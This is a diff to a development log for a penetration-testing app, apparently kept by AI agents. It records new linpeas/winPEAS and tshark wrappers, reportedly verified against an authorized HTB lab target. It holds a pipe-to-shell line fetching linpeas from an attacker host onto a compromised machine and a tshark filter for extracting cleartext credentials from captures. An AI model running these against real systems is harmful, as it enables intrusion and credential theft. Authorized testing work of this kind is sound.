@@ -6,6 +6,90 @@ was verified, and what the next agent should pick up.
 
 ---
 
+## 2026-09-03 (59) — feat: linpeas/winPEAS and tshark tools
+
+**Done (user, after the live-testing rounds in entries 57-58: "จากที่
+ทดสอบมาต้องการเครื่องมืออะไรเพิ่มไหมครับ" — asked what tools were
+missing based on everything tested so far; picked linpeas/winPEAS and
+tshark from the recommendation list):**
+
+- **`oculus/tools/linpeas_tool.py`** (new tool: `linpeas`) — a
+  structurally different shape from every other wrapper in this app.
+  `OSCP-PRIVL-01`/`OSCP-PRIVW-01` ("Privilege Escalation Enumeration")
+  were `tools=[]` because the actual enumeration has to run *on* the
+  compromised host, which this app has no way to reach (it only talks
+  to the network target) — linpeas.sh/winPEASx64.exe can't be "run
+  against a target" the way every other tool here is. Instead of
+  leaving the gap, wrapped it as a **serve, don't scan** tool:
+  `build_command()` starts `python3 -m http.server 8022 --directory
+  /opt/peas` for up to 5 minutes (generous — this is a download window,
+  not a scan budget) so a tester can pull the real script onto their
+  own foothold shell (`curl http://<attacker-ip>:8022/linpeas.sh | sh`)
+  and stop the server (the existing Stop/cancel button) once done. The
+  *target* field is deliberately ignored — same "honest placeholder"
+  precedent as `searchsploit_tool.py`. Overrides `is_available()` (not
+  just the binary check `BaseTool` does by default) to also confirm
+  `/opt/peas/linpeas.sh` actually exists — otherwise "available" would
+  be true from python3 alone even with nothing real to serve.
+- **`oculus/tools/tshark_tool.py`** (new tool: `tshark`) — also doesn't
+  scan the network target: reads an already-captured `.pcap` (from
+  entry 53's evidence upload, a manual download, or a MITM capture)
+  and extracts cleartext FTP/HTTP/POP/IMAP/SMTP credentials via `-Y
+  "ftp.request.command || http.request || ..." -T fields ...`. Fast
+  mode is a protocol-hierarchy overview (`-z io,phs`) instead. Wired
+  into `OSCP-POST-01` ("Credential Harvesting & Loot Collection").
+- `Dockerfile`: added `tshark` to the main apt install (needed a
+  `debconf-set-selections` preseed for the `wireshark-common`
+  postinst's interactive "allow non-root capture?" prompt, which
+  otherwise hangs a non-interactive `docker build` forever — preseeded
+  to "false" since this tool only ever reads a file with `-r`, never a
+  live interface) and a new step downloading `linpeas.sh`/
+  `winPEASx64.exe` from the upstream PEASS-ng GitHub releases into
+  `/opt/peas`.
+- `oculus/tools/__init__.py`: registered both in `TOOL_REGISTRY` (32
+  tools total now).
+
+**Verified (against a real, authorized HTB target — same one as
+entries 57-58):**
+- `docker compose build backend` succeeded clean — confirmed the
+  `debconf-set-selections` preseed actually worked (no interactive
+  hang on the tshark install, which the previous entries' history
+  notes it definitely will do without it).
+- `GET /api/tools` on the live rebuilt container: both `tshark` and
+  `linpeas` show `available: true`; confirmed `/opt/peas/linpeas.sh`
+  (1.1MB) and `/opt/peas/winPEASx64.exe` (11MB) are really there via
+  `docker compose exec`.
+- Started the real `python3 -m http.server` inside the container and
+  `curl`'d it from inside the same container: `HTTP 200`, exactly
+  1144032 bytes — the real file, served correctly end-to-end.
+- For tshark: captured 15 real packets inside the container itself
+  (`tshark -i eth0 -w ... -f "tcp port 21"`) while making a real
+  anonymous FTP connection to the live target, then ran the actual
+  `TsharkTool` (both fast and full mode) against that real capture —
+  full mode correctly extracted `USER anonymous` / `PASS
+  anonymous@example.com` as separate fields; fast mode's protocol-
+  hierarchy output correctly showed 5 of the 15 frames as `ftp`.
+
+**Next steps for the next agent:**
+1. Could not validate tshark's command against a pcap actually
+   *downloaded from the live target's own `/data/<id>` endpoint* (it's
+   auth-gated — getting valid credentials is the unsolved part of the
+   target box itself, out of scope for evaluating OCULUS) — verified
+   instead with a self-captured real pcap of the same protocol
+   (anonymous FTP against the same target), which exercises the exact
+   same filter/field-extraction path.
+2. `linpeas`'s serve-don't-scan shape means its own "Tool output" panel
+   only ever shows the HTTP server's request log, never the actual
+   enumeration results — those appear in the tester's foothold shell,
+   entirely outside this app. Worth calling out clearly in the UI if a
+   tester is ever confused why "running" linpeas doesn't show privesc
+   findings the way every other tool's output does.
+3. Port 8022 is hardcoded (`_PEAS_PORT` in `linpeas_tool.py`) — fine for
+   local/single-tester use (this whole app's model), but would collide
+   if two linpeas runs against different engagements ran at once.
+
+---
+
 ## 2026-09-03 (58) — feat: searchsploit/metasploit auto-search by discovered service+version
 
 **Done (user, continuing entry 57's live-testing session: "checklists
